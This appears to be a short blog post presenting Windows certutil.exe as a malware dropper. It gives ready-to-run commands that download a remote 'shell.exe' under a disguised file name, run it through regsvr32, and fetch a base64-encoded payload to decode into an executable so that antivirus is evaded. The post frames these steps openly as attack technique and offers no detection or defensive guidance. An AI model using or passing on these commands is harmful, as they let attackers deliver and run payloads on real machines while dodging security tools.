---
title: Abusing certutil to download payload and bypass AV
date: 12/04/2021
author: Soufiane Fariss
email: soufiane.fariss@um5s.net.ma
---

## Certutil.exe as a Dropper
Windows manages certificates using a utility called `certutil.exe`. This tool allows for management of different CA, including showing, dumping and perform various functions related to certificates.

It's unsprising that such a tool will have remote connection abilities such connecting to a remote server, fetching a file.. etc. However, malware authors have abused this functionality to leverage new ways of distrubiting malware.

In the absence of tools like `wget`, `curl` certutil can be a great a choice since it's file format-agnostic, allows for encoding/decoding and is signed by Microsoft. All of this factors make certutil an excellent dropper

## Absuing certutil to downloand a file from a remote server
It is as easy as issuing the follwing command:
```
certutil -urlcache -split -f https://fariss.tech/shell.exe my_file_is_not_malware.blah
regsvr32.exe /s /u /I:my_file_is_not_malware.blah not_malware.dll
```

## Bypassing AV using certutil
CertUtil has a great set of functionlaties, one of those is base64 encoding and decoding. To avoid transerfering shellcode on the wire, certutil allows to base64 dencode the payload which allows for stealth and efficiency

For example:
```
C:\Temp>certutil.exe -urlcache -split -f "https://fariss.tech/badcontent.txt" bad.txt
C:\Temp>certutil.exe -decode bad.txt bad.exe
```

## Other Functionalities
Certutil also allows for decoding hex byte streams with `-decodehex` adding a new layer the can be abused.
